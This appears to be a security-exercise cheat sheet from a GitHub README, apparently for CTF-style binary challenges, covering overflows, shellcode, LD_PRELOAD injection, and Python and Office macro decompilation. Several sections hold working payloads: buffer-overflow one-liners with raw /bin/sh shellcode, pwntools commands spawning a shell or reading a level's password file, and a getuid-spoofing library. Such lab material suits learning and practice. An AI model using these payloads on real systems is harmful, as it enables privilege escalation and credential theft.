<img height="100px" src="https://user-images.githubusercontent.com/28403617/172731874-c08c9da6-bac7-4836-b8bc-3744087d30a3.svg#gh-light-mode-only" />
<img height="100px" src="https://user-images.githubusercontent.com/28403617/172731902-a0475209-6730-4a90-996f-f7688d49506e.svg#gh-dark-mode-only" />

---

- [Binary ninja](#binary-ninja)
- [Decompile Python Executable](#decompile-python-executable)
- [GCC](#gcc)
- [Lib Injection](#lib-injection)
- [Macro Office PPTM](#macro-office-pptm)
- [OverFlow](#overflow)
- [Shellcode](#shellcode)

# Overflow
### Basic
```bash
(python -c "import struct; print('A' * (100 - 0) + struct.pack('<I', 0xffffffff))")
```

### Shellcode
```bash
(python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (100 - 21) + struct.pack('<I', 0xffffffff))")
```

# Shellcode
### Cat
```bash
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass')); print(shell); print(len(shell))"
```

### Exec sh 1
```bash
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.sh()); print(shell); print(len(shell))"
```

### Exec sh 2
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
21
```

# GCC
### Get env address
```
x/10s **(char***)&environ
```
## Peda
### Install
```bash
git clone https://github.com/longld/peda.git ~/.peda
echo "source ~/.peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

# Binary ninja
### Scrap code from html

```javascript
let result = '';
[...document.querySelectorAll('.LinearDisassemblyLine')].forEach(parent_elmt => {
  [...parent_elmt.children].forEach(children_elmt => {
    result += children_elmt.textContent
  });
  result +=  '\n'
});
console.log(result);
```

# Lib Injection
- Recreate getuid function
```C
uid_t	getuid(void)
{
	return (4242);
}
```
- compile
```bash
gcc -shared -fpic lib.c -o libnike.so -m32
```
- run and inject
```bash
LD_PRELOAD=./libnike.so ./exec
```

# Decompile Python Executable
Convert executable into .pyc
```bash
git clone https://github.com/extremecoders-re/pyinstxtractor
cd pyinstxtractor
python3 pyinstxtractor.py exec
```

Disassembly .pyc (compatible python 3.9.2)
```bash
git clone https://github.com/zrax/pycdc
cd pycdc
cmake
make
./pycdc file.pyc # Convert .pyc into .py
./pycdas file.pyc # Convert .pyc into byte-code disassembly
```

# Macro Office PPTM
### Install
```bash
sudo pip3 install oletools
```

### Decompress PPTM
```bash
olevba  -c file.pptm
```
